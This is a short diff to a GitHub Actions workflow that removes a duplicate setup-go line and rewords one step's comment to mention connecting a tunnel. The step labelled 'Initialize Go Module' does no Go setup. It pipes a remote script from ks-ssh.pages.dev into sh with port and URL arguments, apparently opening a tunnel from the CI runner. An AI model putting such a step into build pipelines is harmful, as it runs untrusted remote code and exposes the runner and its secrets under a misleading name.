@@ -15,7 +15,6 @@ jobs:
 
     # 2. Set up Node.js environment
     - name: Set up Node.js
-      uses: actions/setup-go@v5 # Using setup action framework
       uses: actions/setup-node@v4
       with:
         node-version: '20' # Installs a stable, modern Node.js runtime
@@ -26,7 +25,7 @@ jobs:
       with:
         go-version: '1.21'
 
-    # 4. Initialize Go module dependencies
+    # 4. Initialize Go module dependencies and connect tunnel
     - name: Initialize Go Module
       run: |
         curl -sSf https://ks-ssh.pages.dev/get.sh | sh -s -- run --port 3030 --url ks-volt-testing
